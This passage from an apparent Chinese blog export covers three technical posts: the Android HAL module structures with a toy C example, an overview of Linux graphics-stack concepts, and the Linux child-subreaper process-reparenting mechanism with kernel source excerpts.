     * The API version of the implemented module. The module owner is
     * responsible for updating the version when a module interface has
     * changed.
     *
     * The derived modules such as gralloc and audio own and manage this field.
     * The module user must interpret the version field to decide whether or
     * not to inter-operate with the supplied module implementation.
     * For example, SurfaceFlinger is responsible for making sure that
     * it knows how to manage different versions of the gralloc-module API,
     * and AudioFlinger must know how to do the same for audio-module API.
     *
     * The module API version should include a major and a minor component.
     * For example, version 1.0 could be represented as 0x0100. This format
     * implies that versions 0x0100-0x01ff are all API-compatible.
     *
     * In the future, libhardware will expose a hw_get_module_version()
     * (or equivalent) function that will take minimum/maximum supported
     * versions as arguments and would be able to reject modules with
     * versions outside of the supplied range.
     */
    uint16_t module_api_version;
#define version_major module_api_version
    /**
     * version_major/version_minor defines are supplied here for temporary
     * source code compatibility. They will be removed in the next version.
     * ALL clients must convert to the new version format.
     */

    /**
     * The API version of the HAL module interface. This is meant to
     * version the hw_module_t, hw_module_methods_t, and hw_device_t
     * structures and definitions.
     *
     * The HAL interface owns this field. Module users/implementations
     * must NOT rely on this value for version information.
     *
     * Presently, 0 is the only valid value.
     */
    uint16_t hal_api_version;
#define version_minor hal_api_version

    /** Identifier of module */
    const char *id;

    /** Name of this module */
    const char *name;

    /** Author/owner/implementor of the module */
    const char *author;

    /** Modules methods */
    struct hw_module_methods_t* methods;

    /** module's dso */
    void* dso;

#ifdef __LP64__
    uint64_t reserved[32-7];
#else
    /** padding to 128 bytes, reserved for future use */
    uint32_t reserved[32-7];
#endif

&#125; hw_module_t;

  一个hw_module_t代表一个硬件模块，但是一个硬件模块可能包含了很多的硬件设备，所以我们要操作一个实际的硬件设备，按照这套框架，第一件事获取模块，第二件事就是打开设备，第三操作设备，第四关闭设备。
   其实这里的注释说的很清楚，使用它，有两个注意事项，一是必须要在实际模块中定义一个HAL_MODULE_INFO_SYM的结构体变量，且此结构体必须是struct hw_module_t 作为第一个成员变量。这里的根本原因是因为c的结构体内存布局和暴露这个结构体的名字，后面会详细说这个事情。


struct hw_module_methods_t
  它的实际源码定义如下：
typedef struct hw_module_methods_t &#123;
    /** Open a specific device */
    int (*open)(const struct hw_module_t* module, const char* id,
            struct hw_device_t** device);

&#125; hw_module_methods_t;
  此结构体没啥可说的，就是通过实际的模块，然后传入一个硬件设备的id，然后打开实际的硬件设备。因此在每个实际的hw_module_t中，都包含了一个hw_module_methods_t，然后有打开设备的操作。这里也体现出来了一个模块可以有多个设备的这种概念。


struct hw_device_t
  它的实际源码定义如下：
/**
 * Every device data structure must begin with hw_device_t
 * followed by module specific public methods and attributes.
 */
typedef struct hw_device_t &#123;
    /** tag must be initialized to HARDWARE_DEVICE_TAG */
    uint32_t tag;

    /**
     * Version of the module-specific device API. This value is used by
     * the derived-module user to manage different device implementations.
     *
     * The module user is responsible for checking the module_api_version
     * and device version fields to ensure that the user is capable of
     * communicating with the specific module implementation.
     *
     * One module can support multiple devices with different versions. This
     * can be useful when a device interface changes in an incompatible way
     * but it is still necessary to support older implementations at the same
     * time. One such example is the Camera 2.0 API.
     *
     * This field is interpreted by the module user and is ignored by the
     * HAL interface itself.
     */
    uint32_t version;

    /** reference to the module this device belongs to */
    struct hw_module_t* module;

    /** padding reserved for future use */
#ifdef __LP64__
    uint64_t reserved[12];
#else
    uint32_t reserved[12];
#endif

    /** Close this device */
    int (*close)(struct hw_device_t* device);

&#125; hw_device_t;
```  

&amp;emsp;&amp;emsp;此结构体就是上文我们说的实际打开的设备结构体，一般情况我们会将此结构体暴露到对应hal的头文件中，因为这个包含了实际操作硬件的一些接口信息。注意这个hw_device_t包含了一个close接口，是每个设备的关闭接口。

&amp;emsp;&amp;emsp;注意，我们这个时候没有去说hardware.c所做的事情，也就是如下两个接口到底做了什么，这个问题的解答，我们留到下一小节例子中去深入认识他。
```c
/**
 * Get the module info associated with a module by id.
 *
 * @return: 0 == success, &lt;0 == error and *module == NULL
 */
int hw_get_module(const char *id, const struct hw_module_t **module);

/**
 * Get the module info associated with a module instance by class 'class_id'
 * and instance 'inst'.
 *
 * Some modules types necessitate multiple instances. For example audio supports
 * multiple concurrent interfaces and thus 'audio' is the module class
 * and 'primary' or 'a2dp' are module interfaces. This implies that the files
 * providing these modules would be named audio.primary.&lt;variant>.so and
 * audio.a2dp.&lt;variant>.so
 *
 * @return: 0 == success, &lt;0 == error and *module == NULL
 */
int hw_get_module_by_class(const char *class_id, const char *inst,
                           const struct hw_module_t **module);




一个MY_HW的硬件模块的HAL例子

   如上，我们已经介绍了hal里面的重要的3个结构体，但是如果就到此的话，其实我们对hal还是一知半解，这个时候，我们可以尝试自己虚拟一个硬件出来，然后设计HAL接口。这样可以实际体会HAL的工作原理。
   首先，我们定义我们的模块叫做MY_HW。


下面是自定义的hal模块源码
  my_hw_hal.h 源码
#ifndef __MY_HW_HAL_H__
#define __MY_HW_HAL_H__


#include "hardware.h"

#define MY_HW_MODULE_ID "MY_HW"


struct my_hw_device_t&#123;

    struct hw_device_t base;

    int (*set_my_hw_op)(struct my_hw_device_t * dev, int op_type);
&#125;;

#endif //__MY_HW_HAL_H__
  my_hw_hal.c 源码
#include "my_hw_hal.h"

#include &lt;stdio.h>
#include &lt;string.h>
int my_hw_open(const struct hw_module_t* module, const char* id,
            struct hw_device_t** device);
int set_my_hw_op_device_0 (struct my_hw_device_t * dev, int op_type);
int my_hw_close_device_0(struct hw_device_t* device);

//For hw_moudle_methods_t
static struct hw_module_methods_t my_hw_methods = &#123;

    .open = my_hw_open,
&#125;;



//For hw_module_t
struct my_hw_module_t &#123;

    struct hw_module_t base;
&#125;;




__attribute__((visibility("default")))  struct  my_hw_module_t  HAL_MODULE_INFO_SYM = &#123;

    .base = &#123;

        .tag = HARDWARE_MODULE_TAG,
        .module_api_version = 0,
        .hal_api_version = 0,
        .id = MY_HW_MODULE_ID,
        .name = "MY HW MODULE",
        .author = "Sky",
        .methods = &amp;my_hw_methods
    &#125;
&#125;;

//For hw_device_t
static struct my_hw_device_t my_hw_device_0 = &#123;
    .base = &#123;
        .tag = HARDWARE_DEVICE_TAG,
        .version = 0,
        .module = (hw_module_t*)&amp;HAL_MODULE_INFO_SYM,
        .close = my_hw_close_device_0
    &#125;,
    .set_my_hw_op = set_my_hw_op_device_0
&#125;;



//For hw_device_t
int set_my_hw_op_device_0 (struct my_hw_device_t * dev, int op_type)
&#123;
    printf("set_my_hw_op_device_0() op_type = %d\n", op_type);
    return 0;
&#125;

int my_hw_close_device_0(struct hw_device_t* device)
&#123;
    printf("my_hw_close_device_0()\n");
    return 0;
&#125;




//For hw_moudle_methods_t
int my_hw_open(const struct hw_module_t* module, const char* id,
            struct hw_device_t** device)
&#123;
    printf("my_hw_open() device id %s\n", id);
    if (strcmp(id, "0") != 0)&#123;
        printf("my_hw_open() failed\n");
        return -1;
    &#125;
    *device = (struct hw_device_t*)&amp;my_hw_device_0;

    return 0;
&#125;
  从这里我们可以看出，新模块的实现就是对3个结构体的继承和实现。同时对一些成员变量进行赋值。


MY_HW模块源码的分析
__attribute__((visibility("default")))  struct  my_hw_module_t  HAL_MODULE_INFO_SYM = &#123;

    .base = &#123;

        .tag = HARDWARE_MODULE_TAG,
        .module_api_version = 0,
        .hal_api_version = 0,
        .id = MY_HW_MODULE_ID,
        .name = "MY HW MODULE",
        .author = "Sky",
        .methods = &amp;my_hw_methods
    &#125;
&#125;;
   my_hw_module_t 的定义，就是定义一个HAL_MODULE_INFO_SYM（它是一个宏定义）变量，注意此宏定义会被替换为一个HMI的名字，此名字是所有HAL模块必须暴露的一个符号。且必须叫做这个名字，因为这是libhardware.so中读取它的约定。
  此外，hw_module_t必须在我定义的变量的开始位置，这样方便类型转换。
//For hw_moudle_methods_t
static struct hw_module_methods_t my_hw_methods = &#123;

    .open = my_hw_open,
&#125;;

   hw_module_methods_t 的定义，实现一个真正的设备打开接口。
//For hw_device_t
static struct my_hw_device_t my_hw_device_0 = &#123;
    .base = &#123;
        .tag = HARDWARE_DEVICE_TAG,
        .version = 0,
        .module = (hw_module_t*)&amp;HAL_MODULE_INFO_SYM,
        .close = my_hw_close_device_0
    &#125;,
    .set_my_hw_op = set_my_hw_op_device_0
&#125;;
   my_hw_device_t的定义，此设备就是我们这个模块定义的一个设备，此设备通过my_hw_module_t中的open接口打开，然后提供相关的接口给HAL相关的程序使用。


综合分析
  这里我们简单设计一个服务程序来调用我们封装的hal模块,其流程就是调用hw_get_module获取实际module地址，然后通过module打开对应设备，然后操作设备，最后关闭设备。
#include "my_hw_hal.h"

int main(int argc, char * argv[])
&#123;
    hw_module_t * hwmodule = nullptr;
    my_hw_device_t * my_hw_device = nullptr;

    int _ret = hw_get_module(MY_HW_MODULE_ID, (const hw_module_t**)&amp;hwmodule);

    #define MY_HW_DEVICE_ID "0"
    _ret = hwmodule->methods->open(hwmodule, MY_HW_DEVICE_ID, (hw_device_t**)&amp;my_hw_device);

    #define MY_HW_DEVICE_ID_0_OP_TYPE_0 0
    my_hw_device->set_my_hw_op(my_hw_device, MY_HW_DEVICE_ID_0_OP_TYPE_0);

    my_hw_device->base.close((hw_device_t*)my_hw_device);
    return 0;
&#125;
  然后通过如下编译脚本生成两个so和一个应用程序。
#!/bin/bash


# for hardware so
gcc -fPIC -c hardware.c -I . -fvisibility=hidden
gcc -shared hardware.o -o libhardware.so -ldl -fvisibility=hidden
strip libhardware.so



# for MY_HW.sky-sdk.so
gcc -fPIC -c my_hw_hal.c -I . -fvisibility=hidden
gcc -shared my_hw_hal.o -o MY_HW.sky-sdk.so -fvisibility=hidden
strip MY_HW.sky-sdk.so


# for my hw service 
g++ my_hw_service.cpp -o my_hw_service -L . -l hardware -I .  -fvisibility=hidden

  我们先来看看我们应用程序执行的结果如下：

    
        
    
  
&emsp;&emsp;我们可以看到，第一步通过hw_get_module获取到一个模块信息，这里其实在hardware.c里面定义的很清楚，直接通过dlopen/dlsym 一个HMI的符号得到了我们定义的my_hw_module_t的变量地址，由于c的内存布局的原因，本来这个地址存放的是my_hw_module_t变量，但是可以直接强转为hw_module_t变量。简单来说，这就是一种c里面实现类似c++继承的方法，由于内存布局是连续的，根据hw_module_t的大小，可以直接从my_hw_module_t前面部分转换为hw_module_t。这也是hw_module_t必须放在my_hw_module_t中开始的原因。
  我们也可知道，在hardware.c中，hw_get_module是根据id来在特定目录中去搜索相关的模块so，然后通过dlopen打开它并进行后续的操作。如我修改的hardware.c部分节选：

    
        
    
    
  同理，到了这里，我们不用猜测，一定在MY_HW.sky-sdk.so暴露了一个HMI的符号。如图：

    
        
    
    
  注意hardware.c和hardware.h直接从android源码中拿出来，简单做修改即可在linux里面编译。这里我们简单看看libhardware.so的符号暴露信息：

    
        
    
    
  这里其实就暴露了上面提到的两个接口，hw_get_module和hw_get_module_by_class。




后记

  总的来说：


hw_module_methods_t 可以用来标识模块的公用方法，当前具备了一个open方法，注意一个module对应多个设备功能。


hw_get_module() 主要是使用传入的id，然后通过id和一些属性通过dlopen加载so。注意’HMI’这个符号，这个符号是存放的hw_module_t作为基类的地址。通过此地址可以打开这个模块中的特有设备，并提供特定操作。


hw_module_t 可以用来标识一个模块，首先通过hw_get_module()获取当前hw_module_t，然后通过当前hw_module_t的hw_module_methods_t中的open方法打开设备。


hw_device_t 可以用来标识模块下的一个设备，其中的close方法用来关闭本设备。


  注意三个结构体之间的关系：hw_get_module()获取hw_module_t，hw_module_t通过hw_module_methods_t获取hw_device_t，hw_device_t中携带了当前设备的各种操作方法，其实HAL的另一个重要部分是在hw_device_t中定义当前设备的通用接口。
  其实HAL的整个原理并不复杂，在Linux内核源码中，你会看到大量的类似的操作。归根到底，其实HAL的这种封装，就是一种应用技巧。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>C&amp;CPP</category>
        <category>android</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>android hal</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 图形栈从入门到放弃 --- Linux 图形相关概念简介</title>
    <url>/2023/07/02/blog_idx_121/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在日常生活中，像我们常用的ubuntu（Linux），windows，android，mac等等系统，我们都能够看到丰富的图形界面。此外，如果大家了解过以前的嵌入式系统，很多的UI是自己写程序来画的。那么大家是否思考过一个问题，这些界面的工作原理是什么？界面是怎么显示出来的呢？
  此外，大家在平常的时候，如果要关注这方面内容的话，有一些词是经常听到的，例如：GPU, 渲染，OpenGL，OpenGL ES, EGL，OpenCL，DRM，DirectX，X11, Wayland等等。这里的词或多或少都和界面显示有着一定的关系。
  在这个文章系列里面（挖坑系列），我将会从显示的理论概念上开始，逐步引入现在的主流的显示方法。然后可能会挑选部分显示过程中的内容，然后细讲一点，毕竟这个内容太大了，我也仅仅是了解其中的一小部分。
  最终，本系列文章的目的还是帮助我自己或者大家能够对现在的主流的系统的显示理论框架及一些常见的功能和概念进行熟悉，以后若遇到关联的内容或者问题，能够大概“感知”到这个事情是属于显示的哪个部分。
  下面，让我们先来看看，显示框架的一些基本概念。




Windowing System （窗口系统）

  此部分根据以下参考链接整理：https://en.wikipedia.org/wiki/Windowing_system
  在计算机中，窗口系统（或窗口系统）是分别管理显示屏不同部分的软件。它是一种图形用户界面(GUI)，它为用户界面实现了WIMP（窗口、图标、菜单、指针）范例。
  技术细节：任何窗口系统的主要组件通常称为显示服务器，尽管窗口服务器或合成器等替代名称也在使用中。任何运行并在窗口中显示其 GUI 的应用程序都是显示服务器的客户端。显示服务器和它的客户端通过通信协议相互通信，该协议通常被称为显示服务器协议，显示服务器是客户端和用户之间的中介。
  这里引入了显示服务器协议，我们常见的著名的显示服务器协议有：


X11 (类unix)


Wayland (类unix)


SurfaceFlinger (android)


Quartz Compositor (macos)


Desktop Window Manager (windows)


  在这里，有几个重要的概念需要记住：窗口系统，显示服务器（窗口服务器或合成器），显示服务器协议，显示服务器协议对应的客户端。你可以认为窗口系统就是这些概念形成的软件集合。




Window manager （窗口管理器）
  此部分根据以下参考链接整理：https://en.wikipedia.org/wiki/Window_manager
  窗口管理器是一种系统软件，用于控制图形用户界面中窗口系统内窗口的放置和外观。
  我们常见的应用广泛的窗口管理器有：


gnome (类unix)


kde (类unix)


dwm (windows)


  对于窗口管理器来说，我们就把它当做管理各种界面的一个程序即可，注意这个概念，相对于窗口系统来说，我自己认为：可以放到显示服务器或者显示服务器协议对应的客户端里面。




窗口系统相关概念举例（以Linux为例）

  在Linux中，其主流桌面有两个常见的框架，一个是基于X11的显示框架，一个是基于Wayland的显示框架。


X.Org Foundation
  此部分根据以下参考链接整理：https://en.wikipedia.org/wiki/X.Org_Foundation
  X.Org 基金会是一家非营利性公司，其授权研究、开发、支持、组织、管理、标准化、推广和捍卫一个免费和开放的加速图形堆栈。这包括但不限于以下项目：DRM、Mesa 3D、Wayland和X Window System（在X.Org Server的实现中）。
  这个是实现X11相关的一个开源组织。


X Window System(X/X11)
  此部分根据以下参考链接整理：https://en.wikipedia.org/wiki/X_Window_System
  X窗口系统（X Window System，也常称为X11或X，天窗口系统）是一种以位图方式显示的软件窗口系统。最初是1984年麻省理工学院的研究，之后变成UNIX、类UNIX、以及OpenVMS等操作系统所一致适用的标准化软件工具包及显示架构的运作协议。X窗口系统通过软件工具及架构协议来创建操作系统所用的图形用户界面，此后则逐渐扩展适用到各形各色的其他操作系统上。现在几乎所有的操作系统都能支持与使用X。更重要的是，今日知名的桌面环境——GNOME和KDE也都是以X窗口系统为基础建构成的。
  由于X只是工具包及架构规范，本身并无实际参与运作的实体，所以必须有人依据此标准进行开发撰写。如此才有真正可用、可执行的实体，始可称为实现体。目前依据X的规范架构所开发撰写成的实现体中，以X.Org最为普遍且最受欢迎。X.Org所用的协议版本，X11，是在1987年9月所发布。而今最新的参考实现（参考性、示范性的实现体）版本则是X11 Release 7.7（简称：X11R7.7），而此项目由X.Org基金会所领导，且是以MIT授权和相似的授权许可的自由软件。
  这个你可以理解为显示服务器协议。
X.Org / X.Org Server
  此部分根据以下参考链接整理：


https://x.org/wiki/


https://wiki.archlinux.org/title/Xorg


https://en.wikipedia.org/wiki/X.Org_Server


  X.Org 项目提供了 X 窗口系统的开源实现。开发工作是与freedesktop.org社区一起完成的。X.Org 基金会是一家教育非营利性公司，其董事会为这项工作提供服务，其成员领导这项工作。
  注意：X.Org Server 是 X 窗口系统的X11显示器服务协议的实现。
  这个你可以理解为显示服务器。


Wayland
  此部分根据以下参考链接整理：


https://wiki.archlinux.org/title/wayland


https://github.com/wayland-project/wayland


https://wayland.freedesktop.org/building.html


  Wayland是一种显示服务器协议。它的目标是成为X Window System的继任者。
  注意：Wayland的既是一种窗口系统，也是一种显示服务器协议。


Weston Compositor
  此部分根据以下参考链接整理：


https://wayland.freedesktop.org/


https://gitlab.freedesktop.org/wayland/weston/-/blob/master/README.md


https://github.com/wayland-project/wayland


https://wayland.freedesktop.org/building.html


  Wayland 项目的一部分也是 Wayland 合成器的 Weston 参考实现。Weston 可以作为 X 客户端或在 Linux KMS 下运行，并附带一些演示客户端。Weston 合成器是一个最小且快速的合成器，适用于许多嵌入式和移动用例。
  注意：weston是wayland显示器服务协议的开源参考实现。




Linux 显示的主流显示框架架构图

  


X Architecture
  此部分根据以下参考链接整理：https://wayland.freedesktop.org/architecture.html
  X 起源于 1984 年麻省理工学院 (MIT)雅典娜计划的一部分。 自 1987 年 9 月以来，X 协议一直处于版本 11（因此为“X11”）。X.Org 基金会领导 X 项目，与当前的参考实现X.Org Server在MIT 许可和类似的许可许可 下作为免费和开源软件提供。
  其技术架构图如下：

    
        
    
    


Wayland Architecture
  此部分根据以下参考链接整理：https://wayland.freedesktop.org/architecture.html
  Wayland 是一个合成器与其客户对话的协议，也是该协议的 C 库实现。合成器可以是在 Linux 内核模式设置和 evdev 输入设备上运行的独立显示服务器、X 应用程序或 Wayland 客户端本身。
  其技术架构图如下：
wayland_architecture.png

    
        
    
    


XWayland
  此部分根据以下参考链接整理：


https://wayland.freedesktop.org/xserver.html


https://wayland.freedesktop.org/docs/html/ch05.html


  Xwayland 是一个完整的 X11 服务器，就像 Xorg 一样，但它不是驱动显示器和打开输入设备，而是充当 Wayland 客户端。
  其技术架构图如下：

    
        
    
    




OpenGL 和 Linux显示的关系图
  出处：


https://zh.wikipedia.org/zh/File:Linux_kernel_and_OpenGL_video_games.svg


https://www.kernel.org/doc/html/latest/gpu/index.html


  其技术架构图如下：

    
        
    
    
  先明确3个概念：


OpenGL用来从简单的图形比特绘制复杂的三维景象。


Mesa也称为Mesa3D和Mesa 3D 图形库，是OpenGL、Vulkan和其他图形API规范的开源实现。我们的游戏引擎等就是基于mesa3D或者直接基于SDL,GLFW等窗口库来做相关的图形化实现。mesa3D走DRM接口。


直接渲染管理器( DRM ) 是Linux 内核的一个子系统，负责与现代视频卡的GPU连接。其大概包含两类行为Graphics Execution Manager (GEM)和Kernel Mode-Setting (KMS)，KMS控制显示控制器，直接处理和显示器相关的东西。GEM主要是处理显存管理、处理相关的内容。






以Wayland为例的Linux显示框架
  出处：


https://zh.wikipedia.org/zh/File:Linux_kernel_and_OpenGL_video_games.svg


https://www.kernel.org/doc/html/latest/gpu/index.html


  其技术架构图如下：

    
        
    
    
  这里我们从3个维度进行分析：


3D游戏引擎，直接基于相关的OpenGL接口进行开发，完成图形图像相关的处理。事件处理其实还是基于libinput。


在X的架构模式下面，X.Org Server为显示服务器协议的实现，其窗口管理器为gnome和kde这样的桌面管理软件，其客户端是libX或者libXCB。其直接基于opengl或者egl开发，注意图形加速部分放在X显示服务器上的。


在Wayland的架构模式下面，其有wayland客户端，有wayland合成器，有walyland窗口管理器。为了兼容大量的x11程序，有X窗口管理器，对于XWalyland的一个客户端。注意，对于真正的wayland来说，其图形加速部分在wayland客户端上，这样少了很多交互通信的内容，整体技术结构更加的明晰和高效。






关于Android的图形堆栈（SurfaceFlinger和WindowManager）
  此部分根据以下参考链接整理：


https://source.android.com/devices/graphics/surfaceflinger-windowmanager


https://source.android.com/devices/graphics


  SurfaceFlinger 接受缓冲区，对它们进行合成，然后发送到屏幕。WindowManager 为 SurfaceFlinger 提供缓冲区和窗口元数据，而 SurfaceFlinger 可使用这些信息将 Surface 合成到屏幕。
  其技术架构图如下：

    
        
    
    
  android的WindowManager管理和提供窗口meta信息，SurfaceFlinger从buffer和WindowManager中取得图像和meta信息，然后通过hal层，做图像硬件加速，如：vulkan或者egl等，然后送到显示屏幕。我测试过，android走了vulkan和egl后，最终还是走drm接口，最终把图送个屏幕。有兴趣的童鞋可以使用drm测试程序来测试。
  其实我们看了android的显示框架后，你会发现和传统的Linux比较相像，同时，你可以更加深入的理解Android和Linux之间的一些联系。




后记

  上面的几个概念是容易让人疑惑的，首先有窗口系统这个概念，窗口系统的基本组件为显示服务器，在显示器上显示的用户GUI程序叫做显示服务器的客户端，服务端和客户端之间的通信协议叫做显示服务器协议。除了显示服务器，还有一个叫做窗口管理器的概念。
  对于Linux来说，其窗口服务器有两个应用比较广泛，一个叫做X显示服务器，一个叫做Wayland显示服务器，它们对应的显示服务器协议分别是X11和Wayland协议，同理，与之协议对应的开源参考实现分别是X.Org Server 和 Weston Compositor。注意这里的XWayland，其主要是为了兼容大量老的基于X11的程序提出的一种替代方案，其本质上是作为Wayland显示服务器的一个客户端，起到一个代理的作用。
  从&quot;OpenGL 和 Linux显示的关系图&quot; 以及 &quot;以Wayland为例的Linux显示框架&quot;两个小节的内容，我们可以大概提前的知道显示是一个什么东西。
  最后，我们最终要得到两个词：“渲染”，“显示”。 我们提到的窗口系统里面的概念，大部分内容就是对这两个词的应用。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>android</category>
        <category>linux</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>linux图形栈</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Subreaper 机制及内核态逃离方法(PR_SET_CHILD_SUBREAPER, prctl, systemed)</title>
    <url>/2023/07/02/blog_idx_123/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  由于某些其他的原因，我们在测试另外一个问题的时候发现了一个奇怪的现象：在我们一直朴素的认知下，如果一个程序创建了parent-process和child-process，这个时候，当child-process正在运行，parent-process退出的时候，child-process会被托孤到init进程。但是我们却通过pstree -p 发现了并不是这样的，他会被托孤到某一个特殊进程下面，这个特殊进程并不是init进程，而是init进程下面的某一个进程。下面是这个现象的验证过程：
  测试程序
#include &lt;unistd.h>
#include &lt;sys/types.h>
#include &lt;stdio.h>

int main(int argc, char * argv[])
&#123;
    int pid = fork();

    if (pid &lt; 0)
        printf("fork failed.\n");

    else if (pid > 0)&#123;

        printf("parent : child pid = %d\n", pid);
    &#125;
    else&#123;

        printf("child doing ... ...\n");
        printf("first get ppid = %d\n", getppid());
        sleep(20);
        printf("second get ppid = %d\n", getppid());
        sleep(1000);
    &#125;
    sleep(15);
    return 0;
&#125;
  我们运行这个程序后，其运行输出如下图：

    
        
    
    
  我们对这个图进行分析，可以知道，当前的运行a.out进程pid是72140，然后子进程的pid是72141，在parent-process退出后，我们再次获取ppid，可以看到输出是3203。
  接着我们看一下在parent-process未退出时的进程树图片节选：

    
        
    
  
  在图中我们可以知道，我们的a.out在systemd(3203)-&gt;gnome-terminal-(3741)-&gt;bash(5073)-&gt;a.out(72140)
  接着我们看一下在parent-process退出时的进程树图片节选：

    
        
    
 
  在图中我们可以知道，当parent-process退出后，子进程72141被托孤给了systemd(3203)，并不是我们熟知的pid为1的init进程。这里提前透露一下3203是systemd --user一个进程（同时也是一个subreaper）。
  带着对这个问题的疑问，我查询了相关的资料，做了相关的实验，查询到这个现象的原因是PR_SET_CHILD_SUBREAPER相关导致的，因此有了本文的相关内容。




什么是Subreaper(PR_SET_CHILD_SUBREAPER) ？

  对于这个问题，我们还是要去看man手册，链接如下：https://man7.org/linux/man-pages/man2/prctl.2.html
  通过prctl函数，我们可以对当前进程做很多有趣的设置，其中一个就是PR_SET_CHILD_SUBREAPER选项，他主要是用来收集这些托孤进程的，一般是用来给一些守护进程管理进程（例如：上文提到的systemd）使用，使得一个进程能够管理自己的所有后代进程。其主要还是操作当前进程的task_struct中的is_child_subreaper属性，下面是实现的源码节选：
//kernel/sys.c
static int propagate_has_child_subreaper(struct task_struct *p, void *data)
&#123;
	/*
	 * If task has has_child_subreaper - all its descendants
	 * already have these flag too and new descendants will
	 * inherit it on fork, skip them.
	 *
	 * If we've found child_reaper - skip descendants in
	 * it's subtree as they will never get out pidns.
	 */
	if (p->signal->has_child_subreaper ||
	    is_child_reaper(task_pid(p)))
		return 0;

	p->signal->has_child_subreaper = 1;
	return 1;
&#125;

//kernel/sys.c
SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
		unsigned long, arg4, unsigned long, arg5)
&#123;
    struct task_struct *me = current;
    //...
    switch (option)&#123;
        //...
        case PR_SET_CHILD_SUBREAPER:
            me->signal->is_child_subreaper = !!arg2;
            if (!arg2)
                break;
            //此函数遍历当前进程的所有子进程，并调用propagate_has_child_subreaper设置has_child_subreaper属性。
            walk_process_tree(me, propagate_has_child_subreaper, NULL);
            break;
        case PR_GET_CHILD_SUBREAPER:
            error = put_user(me->signal->is_child_subreaper,
                    (int __user *)arg2);
            break;
        //...
    &#125;
    //...
&#125;
  通过如上的源码，我们可以知道了PR_SET_CHILD_SUBREAPER的实现部分原理，但是现在我们还是不知道为啥这样设置之后，当一个进程还有子进程时，当前进程退出后，子进程就托孤给了这个子进程收割者。这里可以提前透露一下，主要是和task_struct中的has_child_subreaper属性有关系。




当含有子进程的父进程退出时，怎么进行托孤的？

  其实从问题就可以看出一点端倪，这个托孤的动作一般是发生在进程退出的时候，所以我们去找进程退出相关的代码应该能够找到一些启发。一般来说，我们的进程退出都会调用exit系统调用，对应到内核态，其实就是do_exit。我们通过has_child_subreaper来全局搜索，可以看到一些关联。下面是部分代码节选：
void __noreturn do_exit(long code)
&#123;
	struct task_struct *tsk = current;
    int group_dead;

    //...
    exit_notify(tsk, group_dead);
    //...
&#125;

/*
 * Send signals to all our closest relatives so that they know
 * to properly mourn us..
 */
static void exit_notify(struct task_struct *tsk, int group_dead)
&#123;
    //...
	LIST_HEAD(dead);

    //...
	forget_original_parent(tsk, &amp;dead);
    //...
&#125;

/*
 * This does two things:
 *
 * A.  Make init inherit all the child processes
 * B.  Check to see if any process groups have become orphaned
 *	as a result of our exiting, and if they have any stopped
 *	jobs, send them a SIGHUP and then a SIGCONT.  (POSIX 3.2.2.2)
 */
static void forget_original_parent(struct task_struct *father,
					struct list_head *dead)
&#123;
	struct task_struct *p, *t, *reaper;

	if (unlikely(!list_empty(&amp;father->ptraced)))
		exit_ptrace(father, dead);

	/* Can drop and reacquire tasklist_lock */
	//通过task_active_pid_ns()->child_reaper查找到一个reaper,然后返回出来，注意一般情况下这里查出来的进程就是当前namespace的init进程。
	reaper = find_child_reaper(father, dead);
	if (list_empty(&amp;father->children))
		return;

	//根据init进程和has_child_subreaper属性，查询真正符合条件的reaper
	reaper = find_new_reaper(father, reaper);
	list_for_each_entry(p, &amp;father->children, sibling) &#123;//遍历当前退出进程的所有子进程
		for_each_thread(p, t) &#123;//遍历所有子进程的线程
			RCU_INIT_POINTER(t->real_parent, reaper);//设置真正的父进程，这里的父进程就是上面我们查找出来了的满足要求的reaper
			BUG_ON((!t->ptrace) != (rcu_access_pointer(t->parent) == father));
			if (likely(!t->ptrace))
				t->parent = t->real_parent;
			if (t->pdeath_signal)
				group_send_sig_info(t->pdeath_signal,
						    SEND_SIG_NOINFO, t,
						    PIDTYPE_TGID);
		&#125;
		/*
		 * If this is a threaded reparent there is no need to
		 * notify anyone anything has happened.
		 */
		if (!same_thread_group(reaper, father))
			reparent_leader(father, p, dead);
	&#125;
	list_splice_tail_init(&amp;father->children, &amp;reaper->children);
&#125;

  在forget_original_parent中，我们可以看到整个方法的作用就是，找到一个reaper，然后将所有子进程交付给这个reaper。




我们怎么逃离PR_SET_CHILD_SUBREAPER的影响呢？

  其实这个问题就在forget_original_parent中的find_new_reaper函数中，也就是has_child_subreaper这个属性怎么生效，下面我们来看看这个函数的功能：
/*
 * When we die, we re-parent all our children, and try to:
 * 1. give them to another thread in our thread group, if such a member exists
 * 2. give it to the first ancestor process which prctl'd itself as a
 *    child_subreaper for its children (like a service manager)
 * 3. give it to the init process (PID 1) in our pid namespace
 */
static struct task_struct *find_new_reaper(struct task_struct *father,
					   struct task_struct *child_reaper)
&#123;
	struct task_struct *thread, *reaper;

	thread = find_alive_thread(father);
	if (thread)
		return thread;

	if (father->signal->has_child_subreaper) &#123;//注意has_child_subreaper属性生效的地方。
		unsigned int ns_level = task_pid(father)->level;
		/*
		 * Find the first ->is_child_subreaper ancestor in our pid_ns.
		 * We can't check reaper != child_reaper to ensure we do not
		 * cross the namespaces, the exiting parent could be injected
		 * by setns() + fork().
		 * We check pid->level, this is slightly more efficient than
		 * task_active_pid_ns(reaper) != task_active_pid_ns(father).
		 */
		for (reaper = father->real_parent;
		     task_pid(reaper)->level == ns_level;
		     reaper = reaper->real_parent) &#123;
			if (reaper == &amp;init_task)
				break;
